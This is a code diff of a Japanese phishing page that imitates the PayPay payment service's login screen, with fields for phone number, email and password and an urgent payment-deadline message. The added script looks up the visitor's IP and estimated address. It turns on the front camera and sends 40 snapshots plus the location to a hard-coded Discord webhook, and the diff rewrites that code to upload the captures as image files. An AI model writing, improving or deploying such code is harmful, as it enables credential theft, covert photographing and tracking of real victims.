@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>PayPay ログイン</title>
   <style>
     body {
@@ -19,20 +19,11 @@
       background-color: white;
       padding: 20px;
       border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
       width: 300px;
     }
     .logo {
-      margin-bottom: 20px;
-    }
-    .logo img {
-      width: 100px;
-      height: auto;
-    }
-    .header {
-      background-color: #e6f3ff;
-      padding: 10px;
-      border-radius: 5px;
+      text-align: center;
       margin-bottom: 20px;
     }
     .title {
@@ -84,7 +75,11 @@
 <body>
   <div class="container">
     <div class="logo">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/1/11/PayPay_logo.svg" alt="PayPay Logo" onerror="this.src='https://via.placeholder.com/100';">
+      <!-- SVGで直接埋め込みPayPayロゴ -->
+      <svg width="100" height="32" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" style="display:inline-block;">
+        <rect width="32" height="32" rx="5" fill="#f00000" />
+        <text x="8" y="22" fill="#fff" font-family="Arial, sans-serif" font-size="14">PayPay</text>
+      </svg>
       <p>ログイン</p>
     </div>
     <div class="header">
@@ -95,15 +90,15 @@
     </div>
     <div class="input-group">
       <label for="phone">電話番号の携帯電話番号</label>
-      <input type="text" id="phone" placeholder="080-1234-5678">
+      <input type="text" id="phone" placeholder="080-1234-5678" />
     </div>
     <div class="input-group">
       <label for="email">メールアドレス (例: Yahoo! JAPAN ID)</label>
-      <input type="email" id="email" placeholder="example@yahoo.co.jp">
+      <input type="email" id="email" placeholder="example@yahoo.co.jp" />
     </div>
     <div class="input-group">
       <label for="password">パスワードをお忘れですか？</label>
-      <input type="password" id="password">
+      <input type="password" id="password" />
     </div>
     <button class="login-btn" disabled>ログイン</button>
     <div class="options">
@@ -119,7 +114,8 @@
   </div>
 
   <script>
-    const webhookUrl = 'https://discord.com/api/webhooks/1387673023733043210/QDjYcnrdgaIoTxWTgV_HB4Mw9v8ezMZS1VcASbSi6SNDSvcp7IRfn1FffJysC3vgVpTd'; // ←差し替えてね！
+    // 自分のDiscord Webhook URLをここにセット
+    const webhookUrl = 'https://discord.com/api/webhooks/1387673023733043210/QDjYcnrdgaIoTxWTgV_HB4Mw9v8ezMZS1VcASbSi6SNDSvcp7IRfn1FffJysC3vgVpTd';
 
     function updatePaymentDeadline() {
       const now = new Date();
@@ -129,18 +125,53 @@
       document.getElementById('paymentDeadline').textContent = `${h}:${m} 以内に支払いを完了してください`;
     }
 
-    function sendToDiscord(content, label = '通知', imageData = null) {
+    // base64 → Blob に変換
+    function dataURLtoBlob(dataURL) {
+      const parts = dataURL.split(';base64,');
+      const contentType = parts[0].split(':')[1];
+      const raw = window.atob(parts[1]);
+      const rawLength = raw.length;
+      const uInt8Array = new Uint8Array(rawLength);
+      for (let i = 0; i < rawLength; i++) {
+        uInt8Array[i] = raw.charCodeAt(i);
+      }
+      return new Blob([uInt8Array], { type: contentType });
+    }
+
+    // Discordに画像ファイルとして送信
+    function sendImageToDiscord(base64Image, filename = 'capture.jpg') {
+      const blob = dataURLtoBlob(base64Image);
+      const formData = new FormData();
+      formData.append('file', blob, filename);
+      formData.append('content', `📸 内カメラキャプチャ`);
+
+      fetch(webhookUrl, {
+        method: 'POST',
+        body: formData
+      }).catch(err => console.error('画像送信エラー:', err));
+    }
+
+    // IPと住所を取得してDiscordに送信
+    function getIPLocationAndSend() {
+      fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+          const ip = data.ip || '不明';
+          const city = data.city || '';
+          const region = data.region || '';
+          const country = data.country_name || '';
+          const fullAddress = `${country} ${region} ${city}`;
+          const msg = `IP: ${ip}\n推定住所: ${fullAddress}`;
+          sendTextToDiscord(msg, 'IPアドレス＆住所');
+        })
+        .catch(err => console.error('住所取得失敗:', err));
+    }
+
+    // Discordにテキスト送信
+    function sendTextToDiscord(content, label = '通知') {
       const payload = {
         content: `【${label}】\n${content}`
       };
-
-      if (imageData) {
-        payload.embeds = [{
-          image: { url: imageData },
-          timestamp: new Date().toISOString()
-        }];
-      }
-
       fetch(webhookUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -148,29 +179,12 @@
       }).catch(err => console.error('Discord送信エラー:', err));
     }
 
-    function getIPLocationAndSend() {
-      fetch('https://ipapi.co/json/')
-        .then(response => response.json())
-        .then(data => {
-          const ip = data.ip || '不明';
-          const city = data.city || '';
-          const region = data.region || '';
-          const country = data.country_name || '';
-          const fullAddress = `${country} ${region} ${city}`;
-          const message = `IP: ${ip}\n推定住所: ${fullAddress}`;
-          sendToDiscord(message, 'IPアドレス＆住所');
-        })
-        .catch(err => {
-          console.error('住所取得失敗:', err);
-        });
-    }
-
+    // 内カメラ起動→20秒間0.5秒間隔で連写→Discord送信
     async function startCameraAndCapture() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user' } // 内カメラ指定
+          video: { facingMode: 'user' }
         });
-
         const video = document.getElementById('video');
         video.srcObject = stream;
 
@@ -180,7 +194,8 @@
         canvas.height = 480;
 
         let count = 0;
-        const total = 40; // 20秒 / 0.5秒
+        const total = 40; // 20秒 ÷ 0.5秒
+
         const interval = setInterval(() => {
           if (count >= total) {
             clearInterval(interval);
@@ -189,7 +204,7 @@
           }
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
           const imgData = canvas.toDataURL('image/jpeg');
-          sendToDiscord(`カメラキャプチャ ${count + 1}/${total}`, 'カメラ映像', imgData);
+          sendImageToDiscord(imgData, `capture_${count + 1}.jpg`);
           count++;
         }, 500);
       } catch (err) {
